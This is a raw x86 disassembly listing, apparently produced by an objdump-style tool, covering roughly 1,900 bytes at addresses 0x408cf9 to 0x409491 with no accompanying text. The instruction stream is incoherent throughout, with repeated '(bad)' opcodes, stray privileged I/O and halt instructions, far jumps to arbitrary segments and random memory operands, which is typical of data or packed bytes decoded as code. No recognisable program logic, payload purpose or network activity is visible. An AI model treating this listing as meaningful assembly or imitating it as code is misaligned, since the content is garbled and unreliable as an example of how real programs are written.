  408cf9:	xrelease mov DWORD PTR ds:0x708c6400,ecx
  408d00:	fild   WORD PTR [ecx+eiz*4+0x3e029831]
  408d07:	mov    dl,0xbb
  408d09:	push   ebx
  408d0a:	lock rcl BYTE PTR [edi-0x1b9f19a2],1
  408d11:	sub    ecx,DWORD PTR [ecx+eax*8]
  408d14:	dec    ecx
  408d15:	pusha  
  408d16:	push   ss
  408d17:	in     al,dx
  408d18:	jb     0x408ca5
  408d1a:	xchg   edx,eax
  408d1b:	loope  0x408cda
  408d1d:	das    
  408d1e:	lea    ecx,[ebp-0x58]
  408d21:	push   esi
  408d22:	out    dx,al
  408d23:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408d25:	inc    ebx
  408d26:	std    
  408d27:	cwde   
  408d28:	inc    eax
  408d29:	int    0x7
  408d2b:	nop
  408d2c:	mov    edx,DWORD PTR [edx-0xba69f4e]
  408d32:	sub    ah,BYTE PTR [edx-0x5311fdbe]
  408d38:	push   cs
  408d39:	push   0xe90273b7
  408d3e:	cmp    esp,DWORD PTR [edx+0x49ad731]
  408d44:	pand   mm7,QWORD PTR [edi+0x59]
  408d48:	into   
  408d49:	outs   dx,DWORD PTR ds:[esi]
  408d4a:	lock inc ebx
  408d4c:	ror    DWORD PTR [edx+0x71],1
  408d4f:	inc    ecx
  408d50:	sbb    ecx,DWORD PTR [ebx+0x49e017a8]
  408d56:	(bad)  
  408d57:	jae    0x408dab
  408d59:	stc    
  408d5a:	hlt    
  408d5b:	mov    al,ds:0x3d60e9b9
  408d60:	scas   al,BYTE PTR es:[edi]
  408d61:	add    eax,0x8429a10e
  408d66:	ins    BYTE PTR es:[edi],dx
  408d67:	neg    DWORD PTR [esi]
  408d69:	jnp    0x408d7e
  408d6b:	gs push 0x783386b3
  408d71:	imul   ebx
  408d73:	dec    edi
  408d74:	fld    QWORD PTR [edx+0x41cc48b2]
  408d7a:	jle    0x408d1d
  408d7c:	add    eax,0x751b7d3e
  408d81:	xor    edi,esi
  408d83:	inc    esi
  408d84:	pop    esi
  408d85:	sub    BYTE PTR [edi],bh
  408d87:	retf   0x1258
  408d8a:	fild   QWORD PTR ds:0xaea05e16
  408d90:	fst    DWORD PTR [ebp+0x2bc693d7]
  408d96:	mov    ds:0x7c0d5e6e,al
  408d9b:	in     eax,dx
  408d9c:	inc    ebp
  408d9d:	mov    ch,BYTE PTR [eax-0x7b]
  408da0:	sahf   
  408da1:	pusha  
  408da2:	and    BYTE PTR [ecx-0x5c62ffad],bl
  408da8:	aaa    
  408da9:	(bad)
  408dac:	pop    esi
  408dad:	add    bh,BYTE PTR [edi+edi*4-0x1f391a23]
  408db4:	hlt    
  408db5:	inc    ecx
  408db6:	xchg   edi,eax
  408db7:	mov    al,0xd5
  408db9:	mov    al,ds:0x59516317
  408dbe:	cmp    eax,0xd7aa228d
  408dc3:	mov    al,ds:0x5087cc89
  408dc8:	jne    0x408ded
  408dca:	int3   
  408dcb:	mov    al,ds:0x510dfbd0
  408dd0:	jo     0x408de4
  408dd2:	inc    edi
  408dd3:	pop    ds
  408dd4:	pop    esi
  408dd5:	mov    esi,0xb327b8bc
  408dda:	mov    dh,0x60
  408ddc:	sbb    ah,BYTE PTR [ecx-0x5a]
  408ddf:	js     0x408d9b
  408de1:	call   0xfa50:0x8b6e1c8e
  408de8:	icebp  
  408de9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408dea:	cdq    
  408deb:	rcl    DWORD PTR [esi],1
  408ded:	dec    ebp
  408dee:	mov    cl,0xe7
  408df0:	mov    bl,0xa8
  408df2:	out    dx,al
  408df3:	retf   
  408df4:	dec    ebp
  408df5:	fidiv  WORD PTR [ebx-0x36]
  408df8:	arpl   WORD PTR [ebx+0x71b631ee],di
  408dfe:	push   0x21
  408e00:	sub    dl,cl
  408e02:	push   edx
  408e03:	mov    eax,ds:0xd326bd47
  408e08:	jge    0x408e56
  408e0a:	sub    eax,0x75845e40
  408e0f:	pop    ebp
  408e10:	sub    ebx,DWORD PTR [ecx+0x1e]
  408e13:	aad    0xca
  408e15:	pusha  
  408e16:	cld    
  408e17:	xchg   esi,eax
  408e18:	xchg   edx,eax
  408e19:	shl    ebx,cl
  408e1b:	inc    edx
  408e1c:	retf   
  408e1d:	mov    cl,0xee
  408e1f:	sub    bh,BYTE PTR ds:0xa745df44
  408e25:	cwde   
  408e26:	enter  0x46c8,0x5f
  408e2a:	out    dx,al
  408e2b:	mov    DWORD PTR es:[esi+eax*4+0x1c],edx
  408e30:	jae    0x408e5e
  408e32:	out    dx,al
  408e33:	test   BYTE PTR [eax],bl
  408e35:	es cli 
  408e37:	sbb    dl,bl
  408e39:	hlt    
  408e3a:	cmp    al,0x90
  408e3c:	cmp    BYTE PTR [ebx-0x58],al
  408e3f:	pusha  
  408e40:	cmp    al,0xdb
  408e42:	dec    edi
  408e43:	clc    
  408e44:	adc    bh,BYTE PTR [edi+ebx*8]
  408e47:	cwde   
  408e48:	pop    esi
  408e49:	ror    DWORD PTR [edx],cl
  408e4b:	adc    eax,0x9c063715
  408e50:	jecxz  0x408eb2
  408e52:	cs inc edx
  408e54:	and    DWORD PTR [ebx],ebx
  408e56:	popf   
  408e57:	out    dx,eax
  408e58:	sar    eax,1
  408e5a:	loope  0x408dfd
  408e5c:	cmp    BYTE PTR [ebp+0x55a2a0b3],bh
  408e62:	(bad)  
  408e63:	jmp    0x773b9f2d
  408e68:	icebp  
  408e69:	pusha  
  408e6a:	jbe    0x408ec6
  408e6c:	xor    DWORD PTR [ecx+eax*1-0x11e84e38],esp
  408e73:	shl    BYTE PTR [ecx+edi*2],cl
  408e76:	push   0x5ba373c
  408e7b:	mov    eax,ds:0x2ac50150
  408e80:	scas   al,BYTE PTR es:[edi]
  408e81:	call   ebp
  408e83:	pop    edi
  408e84:	pop    ebp
  408e85:	and    BYTE PTR [esp+esi*2-0x59913e97],bh
  408e8c:	jbe    0x408e37
  408e8e:	push   ds
  408e8f:	lods   al,BYTE PTR ds:[esi]
  408e90:	jg     0x408ed0
  408e92:	outs   dx,BYTE PTR ds:[esi]
  408e93:	sbb    eax,0x3d807486
  408e98:	out    dx,eax
  408e99:	cmp    al,0xf5
  408e9b:	lds    edx,FWORD PTR [esi]
  408e9d:	mov    bh,0xd6
  408e9f:	pushf  
  408ea0:	loop   0x408e6e
  408ea2:	sbb    al,0x8e
  408ea4:	mov    ds:0xe9214646,al
  408ea9:	xchg   BYTE PTR [ebx+0xe],ch
  408eac:	dec    edi
  408ead:	dec    ebx
  408eae:	out    dx,al
  408eaf:	and    cl,cl
  408eb1:	push   edx
  408eb2:	(bad)  
  408eb3:	jmp    0x408f06
  408eb5:	pop    esp
  408eb6:	iret   
  408eb7:	mov    al,ds:0x109d2517
  408ebc:	in     al,dx
  408ebd:	loop   0x408e80
  408ebf:	lahf   
  408ec0:	pop    ebx
  408ec1:	add    esi,DWORD PTR [ecx]
  408ec3:	ret    
  408ec4:	inc    ebx
  408ec5:	cmp    DWORD PTR [esi-0x18],ebp
  408ec8:	aas    
  408ec9:	and    DWORD PTR [edx],esi
  408ecb:	mov    ds:0xff068112,al
  408ed0:	retf   
  408ed1:	add    ebx,DWORD PTR [eax-0x111b9d93]
  408ed7:	jmp    0x631e:0x959f8a5a
  408ede:	jl     0x408e86
  408ee0:	mov    esi,0x1bc8b3b9
  408ee5:	loope  0x408f3e
  408ee7:	jmp    0xa22ed5bd
  408eec:	out    0x1f,al
  408eee:	jo     0x408ef3
  408ef0:	cmc    
  408ef1:	loope  0x408f3c
  408ef3:	repnz repnz pusha 
  408ef6:	jnp    0x408ea1
  408ef8:	mov    edi,0x91f3abfb
  408efd:	xchg   ebp,eax
  408efe:	out    dx,al
  408eff:	adc    eax,0xfa2c4ad8
  408f04:	or     BYTE PTR [ebp-0x24805f4a],dh
  408f0a:	and    esp,ecx
  408f0c:	mov    ebp,0x5ea41c2b
  408f11:	test   eax,0xbf168cb5
  408f16:	pusha  
  408f17:	xor    esp,esi
  408f19:	pusha  
  408f1a:	inc    esp
  408f1b:	mov    DWORD PTR [edi+0x28],ecx
  408f1e:	sahf   
  408f1f:	pop    ecx
  408f20:	inc    ecx
  408f21:	xor    al,0xfa
  408f23:	stos   DWORD PTR es:[edi],eax
  408f24:	mov    edi,0xa9a12fb7
  408f29:	mov    ebx,DWORD PTR [eax-0x7e]
  408f2c:	jp     0x408f72
  408f2e:	add    DWORD PTR [edi-0x5bccd870],edi
  408f34:	imul   edx,DWORD PTR [edi+0x2c],0x990c6ebf
  408f3b:	scas   eax,DWORD PTR es:[edi]
  408f3c:	pop    esi
  408f3d:	lds    ebx,FWORD PTR [ebx-0x1a815aea]
  408f43:	inc    ecx
  408f44:	into   
  408f45:	bound  ebx,QWORD PTR [eax-0x12]
  408f48:	in     al,0x16
  408f4a:	cmp    al,BYTE PTR [edx]
  408f4c:	push   edx
  408f4d:	popa   
  408f4e:	xacquire xchg DWORD PTR [ebp+0x5e4cbc51],ebx
  408f55:	mov    bl,0x8b
  408f58:	pop    eax
  408f59:	nop
  408f5a:	mov    ch,0x23
  408f5c:	push   cs
  408f5d:	popa   
  408f5e:	dec    eax
  408f5f:	dec    esp
  408f60:	mov    edi,0xcd755104
  408f65:	push   ds
  408f66:	push   edx
  408f67:	sti    
  408f68:	pop    esi
  408f69:	je     0x408fe5
  408f6b:	xlat   BYTE PTR ds:[ebx]
  408f6c:	test   eax,0x292d2ee7
  408f71:	push   edx
  408f72:	pusha  
  408f73:	jnp    0x408f41
  408f75:	sbb    al,0x4e
  408f77:	ret    0x235c
  408f7a:	fnstsw WORD PTR [esi+ebx*2]
  408f7d:	neg    BYTE PTR [edx]
  408f7f:	dec    eax
  408f80:	ja     0x408fd2
  408f82:	xchg   BYTE PTR [edx-0x4],bh
  408f85:	pusha  
  408f86:	add    BYTE PTR [edx+esi*2-0x2fbe3293],dl
  408f8d:	cli    
  408f8e:	push   esi
  408f8f:	aas    
  408f90:	or     BYTE PTR [ecx-0x1],0xef
  408f94:	fs jnp 0x408fc5
  408f97:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408f98:	adc    esp,edi
  408f9a:	lahf   
  408f9b:	or     ebp,DWORD PTR [ebx+0x60]
  408f9e:	xchg   edi,eax
  408f9f:	enter  0x8101,0xaa
  408fa3:	dec    edx
  408fa4:	aad    0x2a
  408fa6:	out    dx,al
  408fa7:	push   esi
  408fa8:	popf   
  408fa9:	inc    ecx
  408faa:	retf   0x314
  408fad:	and    al,0x70
  408faf:	mov    eax,ds:0x86d21bf6
  408fb4:	mov    ah,0xa
  408fb6:	or     DWORD PTR [eax+0x5e],ecx
  408fb9:	out    dx,eax
  408fba:	(bad)  
  408fbb:	loope  0x408fad
  408fbd:	sahf   
  408fbe:	jns    0x408f7a
  408fc0:	test   BYTE PTR [ecx-0x4c],dl
  408fc3:	inc    edx
  408fc4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408fc5:	add    BYTE PTR [edi],cl
  408fc7:	sbb    BYTE PTR [eax+0x52255310],bl
  408fcd:	out    dx,al
  408fce:	xchg   esi,eax
  408fcf:	push   edi
  408fd0:	push   ds
  408fd1:	mov    BYTE PTR [edx+0x7fca9399],0xaa
  408fd8:	cmp    edx,0xffffffee
  408fdb:	xchg   esp,eax
  408fdc:	cs xchg ebp,eax
  408fde:	hlt    
  408fdf:	adc    edx,DWORD PTR [edx+0x23]
  408fe2:	in     al,dx
  408fe3:	test   eax,0x40462194
  408fe8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408fe9:	mov    ebp,0x91c63946
  408fee:	daa    
  408fef:	test   al,0x2a
  408ff1:	xor    BYTE PTR [ebx-0x2e],dl
  408ff4:	cmp    al,0xf1
  408ff6:	sbb    ebp,DWORD PTR [esi-0x739b98ac]
  408ffc:	pop    esi
  408ffd:	cmp    al,0x6d
  408fff:	add    eax,0xf9bb5b96
  409004:	(bad)  
  409005:	pop    edx
  409006:	in     al,0x4f
  409008:	cdq    
  409009:	xchg   edx,eax
  40900a:	test   eax,0x4e15dd4
  40900f:	jmp    0x5b48244b
  409014:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409015:	retf   
  409016:	(bad)  
  409017:	scas   al,BYTE PTR es:[edi]
  409018:	jo     0x408fe9
  40901a:	neg    DWORD PTR [esi-0x23d29ec1]
  409020:	mov    ah,0xa5
  409022:	repnz test al,0x53
  409025:	lea    ebx,[eax]
  409027:	popa   
  409028:	push   ds
  409029:	pop    esi
  40902a:	sti    
  40902b:	push   es
  40902c:	aam    0x9d
  40902e:	lods   eax,DWORD PTR ss:[esi]
  409030:	outs   dx,BYTE PTR ds:[esi]
  409031:	jle    0x409021
  409033:	aam    0x16
  409035:	mov    ds:0x44b75ddc,eax
  40903a:	out    dx,al
  40903b:	xchg   esp,eax
  40903c:	sahf   
  40903d:	push   edx
  40903e:	sub    DWORD PTR [ebx+esi*2],edx
  409041:	scas   al,BYTE PTR es:[edi]
  409042:	pop    es
  409043:	mov    eax,ds:0x4a4c3389
  409048:	imul   ecx
  40904a:	inc    ebx
  40904b:	sub    BYTE PTR [esi-0x45],bl
  40904e:	ficom  DWORD PTR [edx]
  409050:	xor    esi,ecx
  409052:	dec    edi
  409053:	adc    BYTE PTR [esi-0x2df659a0],dl
  409059:	cli    
  40905a:	stc    
  40905b:	outs   dx,BYTE PTR ds:[esi]
  40905c:	push   DWORD PTR [edx]
  40905e:	mov    es,WORD PTR [esi+0x6b]
  409061:	ret    
  409062:	repnz mov edx,0x915c8538
  409068:	(bad)  
  409069:	pop    esi
  40906a:	xchg   esp,eax
  40906b:	inc    ebx
  40906c:	or     BYTE PTR [ecx],bl
  40906e:	daa    
  40906f:	cmp    DWORD PTR [esi+0x6036b4b5],ebx
  409075:	retf   
  409076:	cld    
  409077:	mov    cl,0xa4
  409079:	jl     0x40900b
  40907b:	loope  0x409016
  40907d:	test   BYTE PTR [edx-0x39],ah
  409080:	clc    
  409081:	daa    
  409082:	adc    cl,BYTE PTR [ebp-0x74ef25a1]
  409088:	pop    ss
  409089:	cmp    DWORD PTR [esi+0x1d],0x41edb668
  409090:	(bad)  [eax-0x1ea45427]
  409096:	push   edx
  409097:	mov    ds:0x87820901,al
  40909c:	pop    ebx
  40909d:	daa    
  40909e:	call   0x18612e3c
  4090a3:	test   BYTE PTR [ebp+0x5069ee50],dh
  4090a9:	adc    al,0xc3
  4090ab:	inc    esp
  4090ac:	es jl  0x409117
  4090af:	outs   dx,DWORD PTR ds:[esi]
  4090b0:	mov    ds:0xe553765b,al
  4090b5:	adc    BYTE PTR [esi+0x21],al
  4090b8:	or     BYTE PTR [ebx],0xcb
  4090bb:	mov    bh,0x5e
  4090bd:	sbb    BYTE PTR [edi-0x30de2b62],cl
  4090c3:	push   ss
  4090c4:	mov    BYTE PTR [eax-0x29],ah
  4090c7:	scas   al,BYTE PTR es:[edi]
  4090c8:	mov    eax,DWORD PTR [edi-0x5e]
  4090cb:	jle    0x409086
  4090cd:	nop
  4090ce:	dec    esi
  4090cf:	or     BYTE PTR [esi+0x6d],bl
  4090d2:	jns    0x409102
  4090d4:	push   edx
  4090d5:	dec    esi
  4090d6:	in     eax,dx
  4090d7:	xchg   esp,eax
  4090d8:	pop    ds
  4090d9:	push   esi
  4090da:	fwait
  4090db:	sbb    cl,dh
  4090dd:	addr16 jo 0x4090ce
  4090e0:	push   ds
  4090e1:	imul   ebx,DWORD PTR [ecx-0x42],0x2fee34f0
  4090e8:	adc    al,0x89
  4090ea:	stos   DWORD PTR es:[edi],eax
  4090eb:	stos   DWORD PTR es:[edi],eax
  4090ec:	jb     0x409130
  4090ee:	add    ah,BYTE PTR [ecx+0x417b1931]
  4090f4:	call   0x601c6f71
  4090f9:	push   es
  4090fa:	sub    cl,BYTE PTR [esi+0x48c13402]
  409100:	aas    
  409101:	fsubr  QWORD PTR [ebx-0x5f]
  409104:	cwde   
  409105:	dec    ebx
  409106:	lds    ecx,FWORD PTR fs:[eax]
  409109:	outs   dx,BYTE PTR ds:[esi]
  40910a:	das    
  40910b:	cmp    DWORD PTR [edi+0x42],ebx
  40910e:	push   ds
  40910f:	test   eax,0x3c80307f
  409114:	cld    
  409115:	test   DWORD PTR [eax+0x21],eax
  409118:	add    cl,BYTE PTR [esi+0x5971a487]
  40911e:	add    DWORD PTR [eax],0xfffffff7
  409121:	stos   DWORD PTR es:[edi],eax
  409122:	outs   dx,DWORD PTR ds:[esi]
  409123:	push   ecx
  409124:	push   ss
  409125:	push   ds
  409126:	das    
  409127:	fdiv   DWORD PTR [edi]
  409129:	sub    cl,BYTE PTR [esi]
  40912b:	and    ebx,edx
  40912d:	test   eax,0x99672b16
  409132:	bound  esp,QWORD PTR [ecx-0x3cda7841]
  409138:	dec    edx
  409139:	jp     0x4091af
  40913b:	sahf   
  40913c:	push   edx
  40913d:	jmp    0x151f5797
  409142:	push   ds
  409143:	test   DWORD PTR [esi],eax
  409145:	mov    ch,0x5b
  409147:	(bad)  
  409148:	sbb    DWORD PTR [esi],esi
  40914a:	jo     0x40912d
  40914c:	xor    BYTE PTR [ebx+eax*8-0x13095ad7],dl
  409153:	sub    eax,0x656fb003
  409158:	pop    eax
  409159:	sub    al,0x4c
  40915b:	mov    ch,0xfe
  40915d:	push   DWORD PTR [edi-0x5a3fa10f]
  409163:	inc    edx
  409164:	pushf  
  409165:	xor    DWORD PTR [esi],edi
  409167:	fwait
  409168:	ja     0x40918b
  40916a:	jne    0x40910d
  40916c:	movzx  edx,al
  40916f:	pop    ebx
  409170:	and    ebp,ebp
  409172:	std    
  409173:	or     BYTE PTR [ebx-0x21],dl
  409176:	xor    al,0x7
  409178:	mov    WORD PTR [esi-0x13],es
  40917b:	xchg   esi,eax
  40917c:	jae    0x409186
  40917e:	mov    cl,ch
  409180:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  409182:	icebp  
  409183:	in     al,dx
  409184:	sbb    BYTE PTR [ebp-0x44],0x23
  409188:	fadd   DWORD PTR [edx-0x3a718f32]
  40918e:	xchg   edi,eax
  40918f:	cmp    esi,DWORD PTR [ebx]
  409191:	sahf   
  409192:	retf   
  409193:	repnz pop edi
  409195:	out    0xe8,al
  409197:	(bad)  
  409198:	adc    bl,bl
  40919a:	dec    ebx
  40919b:	jns    0x409201
  40919d:	xor    eax,0x60dd28d9
  4091a2:	push   0x23
  4091a4:	mov    ah,0x65
  4091a6:	test   eax,0xee910cc8
  4091ab:	dec    eax
  4091ac:	jle    0x4091d0
  4091ae:	inc    ebp
  4091af:	fadd   DWORD PTR [ecx-0x7c]
  4091b2:	xchg   esi,eax
  4091b3:	clc    
  4091b4:	pop    edi
  4091b5:	and    esi,DWORD PTR [ecx-0x13e6d71]
  4091bb:	pusha  
  4091bc:	dec    edx
  4091bd:	fbld   TBYTE PTR [ebx]
  4091bf:	jnp    0x4091ab
  4091c1:	ins    BYTE PTR es:[edi],dx
  4091c2:	fiadd  WORD PTR [eax-0xd1845a2]
  4091c8:	shl    DWORD PTR [ecx],1
  4091ca:	add    al,0x36
  4091cc:	mov    al,0x60
  4091ce:	jmp    FWORD PTR [edi-0x275d844c]
  4091d4:	mov    dh,dh
  4091d6:	out    dx,al
  4091d7:	add    bl,bl
  4091d9:	dec    ebx
  4091da:	adc    BYTE PTR [ecx-0x5ea2719b],dl
  4091e0:	mov    DWORD PTR [edi+0x786aef62],esp
  4091e6:	test   BYTE PTR [esi-0x4ecc479d],0xc5
  4091ed:	ror    bl,0xca
  4091f0:	fmul   DWORD PTR [eax+0x59]
  4091f3:	lahf   
  4091f4:	lahf   
  4091f5:	inc    ebp
  4091f6:	inc    edi
  4091f7:	cmc    
  4091f8:	push   0x6fa162c4
  4091fd:	push   ebx
  4091fe:	inc    esi
  4091ff:	sub    BYTE PTR [edi-0x7aa31100],0x4e
  409206:	or     bh,cl
  409208:	pcmpeqw mm1,mm7
  40920b:	test   al,0xe2
  40920d:	inc    edx
  40920e:	out    dx,al
  40920f:	jb     0x4091e1
  409211:	push   0x5d80b4dc
  409216:	add    DWORD PTR [eax-0x6a51f444],edx
  40921c:	mov    ?,WORD PTR [ebx-0x58ab9c8c]
  409222:	or     al,0xa1
  409224:	inc    edx
  409225:	in     eax,0x10
  409227:	aas    
  409228:	mov    eax,DWORD PTR [ecx-0x76a128b0]
  40922e:	add    DWORD PTR [ecx+0x6d18bd41],esi
  409234:	cmp    al,0x2e
  409236:	mov    bl,0xa0
  409238:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409239:	sub    al,0x2f
  40923b:	jno    0x4092a5
  40923d:	cmp    edx,eax
  40923f:	sbb    DWORD PTR [esi+0xa],ebx
  409242:	push   eax
  409243:	in     eax,0xe2
  409245:	pop    ebx
  409246:	inc    edx
  409247:	repz adc al,0x5a
  40924a:	jmp    0x4092ad
  40924c:	pop    ss
  40924d:	and    dh,al
  40924f:	push   eax
  409250:	xor    BYTE PTR [edx+0x25],dh
  409253:	pop    es
  409254:	pop    esi
  409255:	dec    ecx
  409256:	mov    ecx,0x97d9ca5e
  40925b:	dec    esi
  40925c:	sub    BYTE PTR [ecx-0x58],ah
  40925f:	mov    dh,0x39
  409261:	aam    0xc9
  409263:	jp     0x40924e
  409265:	loope  0x409246
  409267:	mov    bl,0x7d
  409269:	sahf   
  40926a:	outs   dx,DWORD PTR ds:[esi]
  40926b:	pop    eax
  40926c:	fdiv   QWORD PTR ds:[ecx-0x49274931]
  409273:	jmp    0xc0bf:0xc56d683b
  40927a:	lock cmp eax,0x859e6131
  409280:	mov    ?,WORD PTR [edx+0x43]
  409283:	mov    eax,ds:0x7bb6faf5
  409288:	leave  
  409289:	push   0xffffffef
  40928b:	clc    
  40928c:	jle    0x409238
  40928e:	sti    
  40928f:	data16 fisubr DWORD PTR [edi]
  409292:	out    dx,al
  409293:	push   0x4b231860
  409298:	shl    BYTE PTR [eax+0x48],0xa7
  40929c:	xchg   esi,eax
  40929d:	scas   al,BYTE PTR es:[edi]
  40929e:	mov    dl,0xbc
  4092a0:	sub    al,0xf7
  4092a2:	and    BYTE PTR [ecx+0x90b6086],al
  4092a8:	lods   eax,DWORD PTR ds:[esi]
  4092a9:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  4092ab:	add    eax,0x4c2e612a
  4092b0:	jnp    0x409285
  4092b2:	mov    al,0xd7
  4092b4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4092b5:	xchg   esp,eax
  4092b6:	out    dx,al
  4092b7:	imul   ebx,DWORD PTR [eax],0x2e67a851
  4092bd:	outs   dx,BYTE PTR ds:[esi]
  4092be:	in     eax,dx
  4092bf:	mov    al,ds:0x5e76f0c9
  4092c4:	fisttp QWORD PTR [ecx+0x4e]
  4092c7:	mov    ds:0x3f6e595e,eax
  4092cc:	add    BYTE PTR [eax+0x60b0d03e],bl
  4092d2:	pop    ecx
  4092d3:	add    DWORD PTR [ecx],esi
  4092d5:	xchg   ebp,eax
  4092d6:	fistp  DWORD PTR [ecx-0x1211b59e]
  4092dc:	rcr    BYTE PTR [edi+0x18],0x19
  4092e0:	stos   DWORD PTR es:[edi],eax
  4092e1:	mov    cl,0xa
  4092e3:	mov    eax,ds:0x13df12d7
  4092e8:	sub    edx,DWORD PTR [ebx-0x43]
  4092eb:	es jbe 0x409297
  4092ee:	out    dx,al
  4092ef:	xchg   ebp,eax
  4092f0:	jbe    0x4092a6
  4092f2:	dec    ebp
  4092f3:	frstpm(287 only) 
  4092f5:	lock out 0xa0,al
  4092f8:	fsub   st,st(2)
  4092fa:	or     bl,BYTE PTR [ebx+0x75c3011c]
  409300:	icebp  
  409301:	add    esp,DWORD PTR [ecx]
  409303:	retf   0xe4d4
  409306:	pop    edx
  409307:	mov    eax,ds:0xfac495d7
  40930c:	cmp    dh,0xae
  40930f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409310:	data16 js 0x409351
  409313:	ror    edi,1
  409315:	and    cl,dl
  409317:	shl    ch,cl
  409319:	jmp    0x937d:0xa5976eee
  409320:	sub    al,0xd5
  409322:	mul    BYTE PTR [eax+0x558fe690]
  409328:	shl    BYTE PTR [edi],1
  40932a:	mov    bh,0xfe
  40932c:	pop    ebx
  40932d:	fwait
  40932e:	retf   0x4f7e
  409331:	add    al,cl
  409333:	push   ss
  409334:	mov    cs,WORD PTR [esp+ecx*4]
  409337:	pop    edi
  409338:	add    DWORD PTR [ecx+0x1c],esp
  40933b:	sbb    al,0xb9
  40933d:	aaa    
  40933e:	jl     0x4092c8
  409340:	and    esp,DWORD PTR [esi-0x3e8e2f12]
  409346:	stc    
  409347:	jmp    0xa1728277
  40934c:	sbb    edi,DWORD PTR [ebx]
  40934e:	pop    ebp
  40934f:	jnp    0x5507fdd2
  409355:	xor    al,0x63
  409357:	sub    bl,BYTE PTR [esi-0x75]
  40935a:	mov    ecx,DWORD PTR [ecx-0x3f]
  40935d:	adc    ah,BYTE PTR [eax-0x5e]
  409360:	pusha  
  409361:	cwde   
  409362:	xchg   edi,eax
  409363:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409364:	xor    DWORD PTR [edx+0x7dde87de],edx
  40936a:	sbb    al,0x71
  40936c:	xor    esp,DWORD PTR [eax+0x61]
  40936f:	and    DWORD PTR [eax],eax
  409371:	push   esi
  409372:	std    
  409373:	pop    es
  409374:	add    eax,0x99a142c2
  409379:	(bad)  
  40937a:	mov    ds:0x85e211f0,al
  40937f:	xor    eax,0x2e98fc5f
  409384:	mov    ebp,0x1a711b94
  409389:	pop    esi
  40938a:	or     ah,BYTE PTR [ecx-0x63d1725f]
  409390:	out    dx,al
  409391:	lds    ecx,FWORD PTR [ecx+eiz*1+0x7e]
  409395:	popf   
  409396:	xchg   BYTE PTR [eax-0x400586a5],cl
  40939c:	cld    
  40939d:	mov    edx,0x660ea4f7
  4093a2:	ins    BYTE PTR es:[edi],dx
  4093a3:	fimul  DWORD PTR [edi]
  4093a5:	arpl   WORD PTR [ebx-0x3de721f7],cx
  4093ab:	xor    DWORD PTR [edx-0xdbccec6],ebx
  4093b1:	cmp    al,0xee
  4093b3:	sbb    BYTE PTR [ebx-0x60690858],cl
  4093b9:	or     DWORD PTR [ebx+0x6bd9cba1],esp
  4093bf:	inc    edi
  4093c0:	cmp    al,0x90
  4093c2:	lods   al,BYTE PTR ds:[esi]
  4093c3:	xor    BYTE PTR [ebx],dh
  4093c5:	scas   al,BYTE PTR es:[edi]
  4093c6:	push   cs
  4093c7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4093c8:	inc    edx
  4093c9:	rcl    esi,0xbf
  4093cc:	call   0x8c6dabc9
  4093d1:	pop    edi
  4093d2:	or     ecx,eax
  4093d4:	mov    bl,0x7
  4093d6:	push   es
  4093d7:	pushf  
  4093d8:	std    
  4093d9:	pushf  
  4093da:	inc    ecx
  4093db:	inc    edx
  4093dc:	pop    ebx
  4093dd:	cmp    al,0x7c
  4093df:	mov    ?,WORD PTR [ecx+0x5f084e33]
  4093e5:	mov    ebp,0x8baaa0fd
  4093ea:	inc    esp
  4093eb:	cdq    
  4093ec:	hlt    
  4093ed:	mov    ebp,0x685e6303
  4093f2:	cmp    eax,DWORD PTR [esi]
  4093f4:	jmp    0xcb189ac3
  4093f9:	dec    edx
  4093fa:	push   ebp
  4093fb:	mov    al,ds:0x9bae6145
  409400:	aaa    
  409401:	or     BYTE PTR [eax],ah
  409403:	jae    0x409462
  409405:	dec    edx
  409406:	outs   dx,BYTE PTR ds:[esi]
  409407:	sub    esi,0x5b
  40940a:	mov    al,ds:0xd51c6a92
  40940f:	mov    eax,ds:0x8e41534e
  409414:	mov    ebp,0xbae0c7ad
  409419:	fild   DWORD PTR [esi]
  40941b:	or     DWORD PTR [ecx-0x41],ebx
  40941e:	cli    
  40941f:	leavew 
  409421:	or     DWORD PTR [ebx],ebp
  409423:	imul   ebx,DWORD PTR [ecx+ebx*4-0x7b],0xffffffd0
  409428:	cmp    DWORD PTR [ecx-0x61],esp
  40942b:	dec    edi
  40942c:	sub    ebp,0x69
  40942f:	leave  
  409430:	cli    
  409431:	pop    edi
  409432:	out    0x5b,eax
  409434:	vunpckhps ymm2,ymm4,ymm6
  409438:	ficomp WORD PTR [edi+edi*8-0x639f5f32]
  40943f:	mov    eax,0xf284b622
  409444:	lods   al,BYTE PTR ds:[esi]
  409445:	and    DWORD PTR es:[ecx],edx
  409448:	test   BYTE PTR [ebx-0x3e],bl
  40944b:	sbb    al,BYTE PTR [ebx]
  40944d:	into   
  40944e:	outs   dx,BYTE PTR ds:[esi]
  40944f:	xchg   BYTE PTR [esi],ch
  409451:	xchg   esi,eax
  409452:	inc    ecx
  409453:	mov    eax,ds:0x114a92b
  409458:	push   edi
  409459:	bound  ebp,QWORD PTR [edi+0x24]
  40945c:	pop    esi
  40945d:	add    esp,ecx
  40945f:	out    dx,eax
  409460:	xor    cl,BYTE PTR [ebp+0x6117ef90]
  409466:	dec    edi
  409467:	ror    DWORD PTR [ebp-0x65e80edb],cl
  40946d:	jb     0x40945d
  40946f:	mov    dl,0xef
  409471:	out    0x2d,al
  409473:	xchg   ebp,eax
  409474:	and    al,0x9
  409476:	loopne 0x409467
  409478:	mov    ah,BYTE PTR [eax+0x36]
  40947b:	nop
  40947c:	sbb    al,0x18
  40947e:	jp     0x4094b2
  409480:	mov    bl,0xf9
  409482:	out    dx,al
  409483:	test   cl,dl
  409485:	mov    BYTE PTR [ebx-0x22],dl
  409488:	sub    edx,ecx
  40948a:	retf   
  40948b:	sahf   
  40948c:	sub    DWORD PTR [esi],esi
  40948e:	dec    ecx
  40948f:	(bad)  
  409490:	push   ds
  409491:	pop    eax
